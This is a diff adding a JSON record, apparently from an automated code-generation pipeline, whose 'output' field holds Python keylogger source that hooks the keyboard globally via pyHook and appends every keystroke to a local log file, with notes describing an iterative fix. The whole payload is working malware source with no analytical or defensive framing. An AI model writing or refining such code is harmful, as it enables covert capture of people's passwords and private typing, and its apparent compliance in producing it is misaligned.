@@ -1,0 +1,8 @@
+{
+  "output": "import pythoncom\nimport pyHook\n\nLOG_FILE = \"keylogs.txt\"\nterminate_key = '\\x1B'\n\ndef OnKeyboardEvent(event):\n    with open(LOG_FILE, 'a') as f:\n        if event.Ascii != 27:\n            key = chr(event.Ascii)\n            f.write(key)\n    return True\n\nhook = pyHook.HookManager()\nhook.KeyDown = OnKeyboardEvent\nhook.HookKeyboard()\npythoncom.PumpMessages()",
+  "notes": "Updated to the correct '\\x1B' code for ESC key and implemented a file listener.",
+  "applied_fixes": [
+    "iteration1_issue1"
+  ],
+  "iterations": 2
+}
